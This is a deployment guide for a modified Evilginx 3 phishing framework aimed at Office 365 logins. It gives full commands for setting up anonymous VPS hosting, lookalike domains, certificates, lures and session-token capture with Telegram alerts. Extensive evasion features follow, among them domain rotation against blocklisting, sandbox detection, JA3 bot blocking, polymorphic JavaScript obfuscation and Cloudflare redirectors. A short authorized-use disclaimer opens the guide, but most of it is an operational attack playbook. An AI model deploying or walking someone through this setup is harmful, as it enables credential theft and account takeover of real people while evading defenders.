# 🚀 Evilginx 3.5.4 Private Dev Edition - Complete Deployment Guide

> **⚠️ LEGAL DISCLAIMER**: This guide is for **AUTHORIZED PENETRATION TESTING AND RED TEAM ENGAGEMENTS ONLY**. Unauthorized use is illegal. Always obtain written permission before conducting security assessments.

---

## 📑 Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [VPS Selection & Setup](#2-vps-selection--setup)
3. [Domain Configuration](#3-domain-configuration)
4. [Server Preparation](#4-server-preparation)
5. [Installation](#5-installation)
6. [SSL/TLS Certificate Setup](#6-ssltls-certificate-setup)
7. [Phishlet Configuration](#7-phishlet-configuration)
8. [Redirector Setup (Turnstile)](#8-redirector-setup-turnstile)
9. [Lure Creation & Distribution](#9-lure-creation--distribution)
10. [Domain Rotation & Multi-Domain Lures](#10-domain-rotation--multi-domain-lures)
11. [Advanced Features & Evasion](#11-advanced-features--evasion)
12. [Operational Security](#12-operational-security)
13. [Troubleshooting](#13-troubleshooting)
14. [Command Reference](#14-command-reference)

---

## 1. Prerequisites

### Required Resources

**Infrastructure:**
- **VPS (Linux)**: Minimum 2GB RAM, 2 CPU cores, 20GB storage (Ubuntu 20.04+/Debian 11+ recommended).
- **Windows Host**: Windows 10/11 or Server 2016+ (if deploying on Windows).
- **Domain Name**: For phishing and redirectors.
- **Cloudflare Account**: Free tier is sufficient.
- **Access**: SSH (Linux) or Administrator Access (Windows).
- **Ports**: 80 (HTTP), 443 (HTTPS), 53 (UDP/DNS) must be available.

**Knowledge Requirements:**
- Basic command line usage.
- Understanding of DNS records.
- Authorization documentation for red team engagement.

---

## 2. VPS Selection & Setup

### Recommended Providers

| Provider | Pros | Cons | Starting Price |
|----------|------|------|----------------|
| **DigitalOcean** | Easy setup, good docs | Popular (may be flagged) | $6/month |
| **Vultr** | Good performance, flexible | Limited regions | $6/month |
| **Linode** | Reliable, established | Moderate pricing | $5/month |
| **Njalla** | Anonymous/Crypto | Higher cost | Varies |

**Selection Criteria:**
- ✅ Accept cryptocurrency/privacy-focused payment.
- ✅ Don't require extensive KYC.
- ✅ Allow port 80/443 traffic.
- ✅ Located near target audience.

### Initial Access (Linux)

```bash
# Connect via SSH
ssh root@YOUR_VPS_IP

# Update system
sudo apt update && sudo apt upgrade -y

# Configure firewall basics
ufw allow 22/tcp    # SSH
ufw allow 80/tcp    # HTTP
ufw allow 443/tcp   # HTTPS
ufw allow 53/udp    # DNS
ufw enable
```

---

## 3. Domain Configuration

### Cloudflare Setup

1. **Add Domain to Cloudflare:**
   - Sign up at cloudflare.com.
   - Add your domain and select the **Free** plan.
   - Update your registrar's nameservers to the ones provided by Cloudflare.

2. **DNS Records:**

   Add the following records in Cloudflare. **CRITICAL: Set Proxy Status to "DNS only" (Enable the Gray Cloud, Disable the Orange Cloud).**

   | Type | Name | Content | Proxy Status |
   |------|------|---------|--------------|
   | A | @ | YOUR_VPS_IP | **DNS only (Gray)** |
   | A | login | YOUR_VPS_IP | **DNS only (Gray)** |
   | A | www | YOUR_VPS_IP | **DNS only (Gray)** |
   | A | * | YOUR_VPS_IP | **DNS only (Gray)** |
   | NS | @ | ns1.yourdomain.com | - |
   | NS | @ | ns2.yourdomain.com | - |

   *Note: For the NS records, point them to your own domain if using Evilginx as a Nameserver, or rely on Cloudflare's management if using only simple A records.*

3. **SSL/TLS Settings:**
   - Go to **SSL/TLS** -> **Edge Certificates**.
   - Enable **Always Use HTTPS**.
   - Set Minimum TLS Version to **1.2**.

---

## 4. Server Preparation

Before installing, ensure no other services are using ports 80, 443, or 53.

```bash
# Check ports
sudo netstat -tulpn | grep ':80\|:443\|:53'

# Stop conflicting services (examples)
sudo systemctl stop apache2
sudo systemctl disable apache2
sudo systemctl stop nginx
sudo systemctl disable nginx
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# Fix DNS resolution after stopping systemd-resolved
echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
```

---

## 5. Installation

### 5.1 Clone Repository

```bash
# Create directory
mkdir -p ~/phishing
cd ~/phishing

# Clone Evilginx3 (Private Dev Edition)
git clone https://github.com/0fukuAkz/Evilginx3.git
cd Evilginx3
```

### 5.2 Linux Automated Installer (Recommended)

For Ubuntu/Debian systems, use the included install script for a complete setup.

```bash
chmod +x install.sh
sudo ./install.sh
```

**The installer automatically:**
- ✅ Installs dependencies (Go, git, etc.)
- ✅ Builds Evilginx from source
- ✅ Creates a dedicated `evilginx` service user (least-privilege)
- ✅ Configures Firewall (UFW)
- ✅ Creates `evilginx` systemd service (runs as non-root with `CAP_NET_BIND_SERVICE`)
- ✅ Creates helper aliases (`evilginx-start`, `evilginx-console`)
- ✅ Optionally creates an admin user for SSH/management (so you can stop using root)

**Post-install commands:**
```bash
evilginx-console    # Configure interactively
evilginx-start      # Start background service
evilginx-status     # Check status
evilginx-logs       # Monitor logs
```

### 5.3 Windows Automated Installer

For Windows 10/11 or Server 2016+.

```powershell
# Open PowerShell as Administrator
cd C:\Users\user\Desktop\Projects\git\Evilginx3
.\install-windows.ps1
```

**The installer automatically:**
- ✅ Installs Go 1.25.1 (if missing)
- ✅ Builds from source
- ✅ Installs NSSM and creates a Windows Service
- ✅ Configures Windows Firewall
- ✅ Creates helper aliases

**Post-install commands:**
```powershell
evilginx-console    # Configure interactively
evilginx-start      # Start Windows service
evilginx-logs       # Monitor logs
```

### 5.4 Manual Installation

If you prefer to build manually:

```bash
# Install Go (Linux) — must match go.mod requirement (1.25.1+)
wget https://go.dev/dl/go1.25.1.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.25.1.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

# Build
# CGO_ENABLED=1 is required — go-sqlite3 uses CGo
# -mod=vendor uses the checked-in vendor/ directory (no network needed)
cd Evilginx3
mkdir -p build
CGO_ENABLED=1 go build -mod=vendor -o build/evilginx main.go

# Install
sudo cp build/evilginx /usr/local/bin/
sudo chmod +x /usr/local/bin/evilginx

# Allow binding to privileged ports without root
sudo setcap 'cap_net_bind_service=+ep' /usr/local/bin/evilginx

# Create config dirs and copy assets
mkdir -p ~/.evilginx/phishlets
mkdir -p ~/.evilginx/redirectors
mkdir -p ~/.evilginx/post_redirectors
cp -r phishlets/* ~/.evilginx/phishlets/
cp -r redirectors/* ~/.evilginx/redirectors/
cp -r post_redirectors/* ~/.evilginx/post_redirectors/
```

### 5.5 Docker Installation (Experimental)

```bash
# Build image
docker build -t evilginx3 .

# Run container
docker run -it \
  -p 443:443 -p 80:80 -p 53:53/udp \
  -v $(pwd)/phishlets:/app/phishlets \
  -v ~/.evilginx:/root/.evilginx \
  evilginx3
```

---

## 6. SSL/TLS Certificate Setup

Evilginx3 uses **CertMagic** for automatic certificate management via Let's Encrypt.

1. **Start Evilginx:**
   ```bash
   evilginx
   ```

2. **Configure Domain & IP:**
   ```bash
   domains set yourdomain.com
   config ipv4 YOUR_VPS_IP
   ```

Certificates will be automatically requested and installed for any phishlet hostname you enable.

**Troubleshooting:**
If certs fail, ensure ports 80/443 are open and your DNS A records point to the VPS IP.

---

## 7. Phishlet Configuration

### Available Phishlets
This build ships with `o365` (Office 365). Additional phishlets can be added to the `phishlets/` directory — see the YAML format in the existing file as a reference.

### Enabling a Phishlet

```bash
# List phishlets
phishlets

# Configure hostname (e.g., Office 365)
phishlets hostname o365 login.yourdomain.com

# Enable
phishlets enable o365
```

---

## 8. Redirector Setup (Turnstile)

Redirectors add a layer of legitimacy and bot protection using Cloudflare Turnstile.

### Step 1: Get Turnstile Keys
1. Go to Cloudflare Dashboard > Turnstile.
2. Create a Site.
   - Mode: **Managed** (or Invisible).
   - Domain: `yourdomain.com` (or the domain hosting the redirector).
3. Copy **Site Key** and **Secret Key**.

### Step 2: Configure Redirector
1. Go to `redirectors/o365_turnstile/` (or matching phishlet name).
2. Edit `index.html`:
   - Replace `YOUR_TURNSTILE_SITE_KEY` with your actual Site Key.
3. Edit the redirect target in `index.html` (Javascript section):
   ```javascript
   window.location.href = 'https://login.yourdomain.com/LURE_PATH';
   ```

### Step 3: Deploy Redirector
You can host the redirector on:
- **Cloudflare Pages / GitHub Pages** (Recommended for separation).
- **Subdomain** on your VPS.

---

## 9. Lure Creation & Distribution

Lures are the unique links you send to targets.

```bash
# Create lure for enabled phishlet
lures create o365

# Edit lure to set redirect URL (where they go AFTER fishing)
lures edit 0 redirect_url https://www.office.com

# (Optional) Set OpenGraph info for nice link previews
lures edit 0 og_title "Account Security Verification"
lures edit 0 og_image https://example.com/logo.png

# Get the phishing URL
lures get-url 0
```

---

## 10. Domain Rotation & Multi-Domain Lures

Domain rotation lets you run **multiple domains simultaneously** for the same phishlet, each with its own lure URL. This provides resilience (if one domain gets flagged, others keep working), distributed traffic, and campaign segmentation.

> 📖 **Full guide:** See [DOMAIN-ROTATION-GUIDE.md](DOMAIN-ROTATION-GUIDE.md) for detailed setup, strategies, DNS configuration, and advanced usage.

### Quick Setup

```bash
# 1. Set primary domain and add more to the pool
domains set evil-domain1.com
domains add evil-domain2.com "backup domain"
domains add evil-domain3.com "campaign B"

# 2. Configure phishlet
phishlets hostname o365 login.evil-domain1.com
phishlets enable o365

# 3. Create lures with different hostnames (all active simultaneously)
lures create o365
lures edit 0 hostname login.evil-domain1.com

lures create o365
lures edit 1 hostname login.evil-domain2.com

lures create o365
lures edit 2 hostname login.evil-domain3.com

# 4. Get URLs — all three work at the same time
lures get-url 0    # → https://login.evil-domain1.com/xK8mQ...
lures get-url 1    # → https://login.evil-domain2.com/pR3nL...
lures get-url 2    # → https://login.evil-domain3.com/vT9wJ...

# 5. Enable automatic rotation
domains rotation enable on
domains rotation strategy round-robin
domains rotation interval 30
```

### Rotation Strategies

| Strategy | Description |
|----------|-------------|
| `round-robin` | Cycles through domains sequentially |
| `weighted` | Distributes based on domain health/weight |
| `health-based` | Prefers domains with best health scores |
| `random` | Random domain selection |

### Monitoring

```bash
domains rotation           # Show configuration
domains rotation stats     # Detailed statistics
domains rotation list      # List pool domains
domains rotation mark-compromised evil-domain2.com "flagged"   # Remove from rotation
```

---

## 11. Advanced Features & Evasion

This Private Dev Edition references `config.json` for advanced settings.

### Configuration Reference (`~/.evilginx/config.json`)

```json
{
  "ja3_fingerprinting": {
    "enabled": true,
    "block_known_bots": true
  },
  "sandbox_detection": {
    "enabled": true,
    "mode": "active",
    "action_on_detection": "redirect"
  },
  "polymorphic_engine": {
    "enabled": true,
    "mutation_level": "high",
    "seed_rotation": 15
  },
  "traffic_shaping": {
    "enabled": true,
    "per_ip_rate_limit": 100,
    "ddos_protection": true
  }
}
```

**Commands:**
```bash
antibot enabled true
antibot action spoof
antibot spoof_url https://google.com
```

### Web API Dashboard
A built-in JSON API and Web GUI are running automatically on port 2030, allowing you to manage phishlets and view sessions via a structured interface.
- **Access URL:** `http://YOUR_VPS_IP:2030/`

### Telegram Notifications
Real-time alerts can be sent directly to your Telegram bot whenever credentials or cookies are captured.
- Enable via: `config telegram enabled true`
- Test configuration: `config telegram test`

### Gophish Integration
Evilginx3 integrates directly with the Gophish database to bridge captured credentials and campaigns.
- Set API URL: `config gophish admin_url http://127.0.0.1:3333`
- Set API Key: `config gophish api_key YOUR_GOPHISH_API_KEY`
- Test connection: `config gophish test`

### Bind Address

By default Evilginx listens on all interfaces using the external IP set via `config ipv4`. To bind to a specific local interface instead:

```bash
config ipv4 external YOUR_PUBLIC_IP   # external IP announced to targets
config ipv4 bind YOUR_LOCAL_IP        # local interface to bind sockets to
```

---


## 12. Operational Security

1. **Infrastructure Isolation**: Never reuse campaign infrastructure. Use fresh VPS and Domains for each engagement.
2. **Access Control**: The installer offers to create a dedicated admin user and disable root SSH login. Use it.
3. **Least Privilege**: The Evilginx service runs as a restricted `evilginx` user, not root. If exploited, the blast radius is limited.
4. **Data Handling**: Exfiltrate captured session tokens securely and destroy data on the VPS after the engagement.

---

## 13. Troubleshooting

**Issue: "Port 443 already in use"**
```bash
sudo lsof -i :443
# Kill the process or stop the service
```

**Issue: Certificates not generating**
- Verify DNS propagation (`dig A login.yourdomain.com`).
- Disable conflicting services (nginx/apache).
- Try `config autocert off` for debugging.

**Issue: "lures can't read turnstile data"**
- This is often harmless (browser requesting icons/manifests). The automated installer includes default files to minimize this.

**Issue: Sessions not capturing**
- Run in debug mode: `./build/evilginx -debug -p ./phishlets` to see raw traffic logs.

**Issue: "port check failed: bind: permission denied"**
- This means the process cannot bind to a privileged port (53, 80, or 443).
- **Fix 1**: Grant port-binding capability: `sudo setcap 'cap_net_bind_service=+ep' /usr/local/bin/evilginx`
- **Fix 2**: Run the automated installer (`sudo ./install.sh`), which sets capabilities automatically.
- **Fix 3**: Use high ports via config: `config https_port 8443`, `config dns_port 5353`.

---

## 14. Command Reference

### General Configuration

| Command | Usage | Description |
| :--- | :--- | :--- |
| **`config`** | `config` | Show all configuration variables. |
| | `config ipv4 external <ipv4_address>` | Set the public IPv4 address announced to targets. |
| | `config ipv4 bind <ipv4_address>` | Set the local interface IP to bind sockets to (defaults to external). |
| | `config unauth_url <url>` | Set redirect URL for unauthorized requests. |
| | `config autocert <on\|off>` | Enable/disable automatic Let's Encrypt certificates. |
| | `config lure_strategy <strategy>` | Set lure URL strategy (`short`, `medium`, `long`, `realistic`, `hex`, `base64`, `mixed`). |
| | `config gophish admin_url <url>` | Set GoPhish admin API URL. |
| | `config gophish api_key <key>` | Set GoPhish API key. |
| | `config gophish test` | Test the GoPhish API connection. |
| | `config telegram bot_token <token>` | Set Telegram bot token for notifications. |
| | `config telegram chat_id <id>` | Set Telegram chat ID to receive notifications. |
| | `config telegram enabled <true\|false>` | Enable or disable Telegram notifications. |
| | `config telegram test` | Send a test Telegram notification. |
| | `config http_port <port>` | Set the HTTP proxy port. |
| | `config https_port <port>` | Set the HTTPS proxy port. |
| | `config dns_port <port>` | Set the DNS server port. |
| | `config redirectors_dir <path>` | Set directory where redirector HTML files are stored. |
| | `config post_redirectors_dir <path>` | Set directory where post-redirector HTML files are stored. |
| **`proxy`** | `proxy` | Show proxy configuration. |
| | `proxy enable`, `proxy disable` | Enable/disable upstream proxy. |
| | `proxy type <http|https|socks5>` | Set proxy type. |
| | `proxy address <address>`, `proxy port <port>` | Configure proxy endpoint. |
| | `proxy username <user>`, `proxy password <pass>` | Configure proxy auth. |
| **`test-certs`** | `test-certs` | Test availability of set up TLS certificates for active phishlets. |
| **`clear`** | `clear` | Clear the terminal screen. |

### Phishlets & Lures

| Command | Usage | Description |
| :--- | :--- | :--- |
| **`phishlets`** | `phishlets` | Show status of all available phishlets. |
| | `phishlets <name>` | Show details of a specific phishlet. |
| | `phishlets create <template> <name> <params...>` | Create a child phishlet from a template with custom params. |
| | `phishlets delete <name>` | Delete a child phishlet. |
| | `phishlets hostname <name> <host>` | Set hostname for a phishlet (e.g. `login.evilsite.com`). |
| | `phishlets unauth_url <name> <url>` | Override global unauth_url just for this phishlet. |
| | `phishlets enable <name>` | Enable phishlet and request SSL/TLS certificates. |
| | `phishlets disable <name>` | Disable phishlet. |
| | `phishlets hide <name>`, `unhide <name>` | Toggle visibility (hidden state logs requests but doesn't serve page). |
| | `phishlets get-hosts <name>` | Generate hosts file entries for local testing. |
| **`lures`** | `lures` | Show all created lures. |
| | `lures create <phishlet>` | Create a new lure for a phishlet. |
| | `lures get-url <id> [params...]` | Generate a phishing URL for a lure. |
| | `lures get-url <id> import <params_file> export <urls_file> <text\|csv\|json>` | Generate bulk phishing URLs from an import text file and export them. |
| | `lures pause <id> <duration>` | Pause a lure for a specific duration (e.g., `1d2h`) and redirect visitors to `unauth_url`. |
| | `lures unpause <id>` | Unpause a lure. |
| | `lures edit <id> <field> <value>` | Edit lure properties (`hostname`, `path`, `redirect_url`, `phishlet`, `info`, `og_title`, `og_desc`, `og_image`, `og_url`, `ua_filter`, `redirector`). |
| | `lures delete <id>`, `lures delete all` | Delete one or more lures. |

### Sessions & Data

| Command | Usage | Description |
| :--- | :--- | :--- |
| **`sessions`** | `sessions` | Show history of captured sessions. |
| | `sessions <id>` | Show detailed session info (tokens, credentials). |
| | `sessions delete <id>`, `sessions delete all` | Delete captured session data. |
| | `sessions export <id>` | Export captured session data to a JSON file. |

### Domain Management

| Command | Usage | Description |
| :--- | :--- | :--- |
| **`domains`** | `domains` | Show base domain, domain pool, and rotation status. |
| | `domains set <domain>` | Set the base domain for all phishlets. |
| | `domains list` | List all configured domains with status and primary flag. |
| | `domains add <domain> [description]` | Add a new domain to the multi-domain pool. |
| | `domains remove <domain>` | Remove a domain from the pool. |
| | `domains set-primary <domain>` | Set which domain is the primary domain. |
| | `domains enable <domain>` | Enable a domain for use. |
| | `domains disable <domain>` | Disable a domain (keeps it in pool but inactive). |
| | `domains rotation` | Show domain rotation configuration. |
| | `domains rotation enable <on\|off>` | Enable or disable automatic domain rotation (auto-populates from configured domains). |
| | `domains rotation strategy <round-robin\|weighted\|health-based\|random>` | Set rotation strategy. |
| | `domains rotation interval <minutes>` | Set rotation interval in minutes. |
| | `domains rotation max-domains <count>` | Set maximum number of domains in pool. |
| | `domains rotation auto-generate <on\|off>` | Enable or disable automatic domain generation. |
| | `domains rotation list` | List all domains in the rotation pool. |
| | `domains rotation add-provider <name> <type> <api_key> <api_secret> <zone>` | Add a DNS provider for domain rotation. |
| | `domains rotation mark-compromised <domain> <reason>` | Mark a domain as compromised and remove from rotation. |
| | `domains rotation stats` | Show detailed rotation statistics. |

### Defense & Evasion

| Command | Usage | Description |
| :--- | :--- | :--- |
| **`blacklist`** | `blacklist <mode>` | Set mode: `all` (block everything), `unauth` (block unauthorized), `noadd` (stop adding ips), `off`. |
| | `blacklist log <on|off>` | Toggle blacklist logging. |
| | `blacklist list` | List all blacklisted IP addresses. |
| | `blacklist add <ip>` | Manually add an IP address to the blacklist. |
| | `blacklist remove <ip>` | Remove an IP address from the blacklist. |
| | `blacklist clear` | Remove all IP addresses from the blacklist. |
| **`whitelist`** | `whitelist <on|off>` | Enable/disable IP whitelist (blocks all non-whitelisted). |
| | `whitelist add <ip>`, `remove <ip>` | Manage allowed IPs. |
| **`antibot`** | `antibot enabled <true\|false>` | Enable/disable unified antibot protection. |
| | `antibot action <block\|spoof>` | Set action on detection: block connection or serve spoofed content. |
| | `antibot spoof_url <url>` | URL to fetch content from when action is 'spoof'. |
| | `antibot threshold <0.0-9.9>` | Set ML detection confidence threshold. |
| | `antibot override_ips list` | List IPs that bypass antibot detection. |
| | `antibot override_ips add <ip>` | Add IP to whitelist (bypasses antibot checks). |
| | `antibot override_ips remove <ip>` | Remove IP from antibot whitelist. |

#### `antibot ja3` — JA3/JA3S TLS Fingerprinting

| Usage | Description |
| :--- | :--- |
| `antibot ja3` | Show basic JA3 fingerprinting statistics. |
| `antibot ja3 stats` | Show detailed JA3 capture and detection statistics. |
| `antibot ja3 signatures` | List all known bot JA3 signatures with name, hash, confidence, and description. |
| `antibot ja3 add <name> <ja3_hash> <description>` | Add a custom bot JA3 signature (hash must be 32-char MD5). |
| `antibot ja3 export` | Export all JA3 signatures to a timestamped JSON file. |

#### `antibot captcha` — CAPTCHA Protection

| Usage | Description |
| :--- | :--- |
| `antibot captcha` | Show current CAPTCHA configuration and provider status. |
| `antibot captcha enable <on\|off>` | Enable or disable CAPTCHA protection. |
| `antibot captcha provider <name>` | Set active CAPTCHA provider (e.g. `turnstile`, `recaptcha_v3`, `hcaptcha`). |
| `antibot captcha configure <provider> <site_key> <secret_key> [key=value...]` | Configure a CAPTCHA provider with site key, secret key, and optional parameters. |
| `antibot captcha require <on\|off>` | Require CAPTCHA verification for all lures. |
| `antibot captcha test` | Display test page URL for verifying CAPTCHA integration. |

#### `antibot sandbox` — Sandbox / VM Detection

| Usage | Description |
| :--- | :--- |
| `antibot sandbox` | Show current sandbox detection configuration and statistics. |
| `antibot sandbox enable <on\|off>` | Enable or disable sandbox detection. |
| `antibot sandbox mode <passive\|active\|aggressive>` | Set detection aggressiveness level. |
| `antibot sandbox threshold <0.0-1.0>` | Set detection confidence threshold. |
| `antibot sandbox action <block\|redirect\|honeypot>` | Set action upon detecting a sandbox or VM. |
| `antibot sandbox redirect <url>` | Set redirect URL when action is 'redirect'. |
| `antibot sandbox honeypot <html>` | Set honeypot HTML response when action is 'honeypot'. |
| `antibot sandbox stats` | Show detailed sandbox detection statistics and detection methods. |

> **Note:** Domain rotation has been moved to `domains rotation`. See the [Domain Management](#domain-management) section above for all rotation commands.

#### `antibot traffic-shaping` — Traffic Shaping / Rate Limiting

| Usage | Description |
| :--- | :--- |
| `antibot traffic-shaping` | Show current traffic shaping configuration and metrics. |
| `antibot traffic-shaping enable <on\|off>` | Enable or disable traffic shaping. |
| `antibot traffic-shaping mode <adaptive\|strict\|learning>` | Set shaping mode. |
| `antibot traffic-shaping global-limit <rate> <burst>` | Set global request rate limit (requests/s) and burst size. |
| `antibot traffic-shaping ip-limit <rate> <burst>` | Set per-IP request rate limit (requests/s) and burst size. |
| `antibot traffic-shaping bandwidth-limit <bytes/sec>` | Set global bandwidth limit in bytes per second. |
| `antibot traffic-shaping geo-rule <country> <rate> <burst> <priority> <block>` | Add geographic rate-limiting rule (country = 2-letter code, block = true/false). |
| `antibot traffic-shaping stats` | Show detailed traffic statistics: requests, rate-limited, DDoS blocked, bandwidth, geographic blocks. |

#### `antibot polymorphic` — Polymorphic JavaScript Engine

| Usage | Description |
| :--- | :--- |
| `antibot polymorphic` | Show current polymorphic engine configuration and mutation statistics. |
| `antibot polymorphic enable <on\|off>` | Enable or disable dynamic code mutation. |
| `antibot polymorphic level <low\|medium\|high\|extreme>` | Set level of code obfuscation. |
| `antibot polymorphic cache <on\|off\|clear>` | Enable, disable, or clear the mutation cache. |
| `antibot polymorphic seed-rotation <minutes>` | Set seed rotation interval in minutes (0 = no rotation). |
| `antibot polymorphic template-mode <on\|off>` | Enable or disable template-based mutations. |
| `antibot polymorphic mutation <type> <on\|off>` | Toggle a specific mutation type: `variables`, `functions`, `deadcode`, `controlflow`, `strings`, `math`, `comments`, `whitespace`. |
| `antibot polymorphic test [code]` | Test polymorphic mutations on sample JavaScript code (generates 3 variants). |
| `antibot polymorphic stats` | Show detailed engine statistics: total mutations, unique variants, cache hits, and hit rate. |

### Infrastructure & Traffic

| Command | Usage | Description |
| :--- | :--- | :--- |
| **`cloudflare`** | `cloudflare config` | Show current Cloudflare Worker configuration. |
| | `cloudflare config account_id <id>` | Set the Cloudflare account ID. |
| | `cloudflare config api_token <token>` | Set the Cloudflare API token. |
| | `cloudflare config zone_id <id>` | Set the Cloudflare zone ID (optional). |
| | `cloudflare config subdomain <subdomain>` | Set the workers.dev subdomain. |
| | `cloudflare config enabled <true\|false>` | Enable or disable Cloudflare Worker deployment. |
| | `cloudflare config test` | Test the Cloudflare API credentials. |
| | `cloudflare worker <type> <redirect_url> [options]` | Generate a Cloudflare Worker script (`simple`, `html`, `advanced`). |
| | `cloudflare deploy <name> <type> <url> [options]` | Deploy a worker directly to Cloudflare. |
| | `cloudflare list` | List all deployed workers. |
| | `cloudflare delete <worker_name>` | Delete a deployed worker. |
| | `cloudflare update <worker_name> <url>` | Update a worker's redirect URL. |
| | `cloudflare status <worker_name>` | Check a worker's deployment status. |
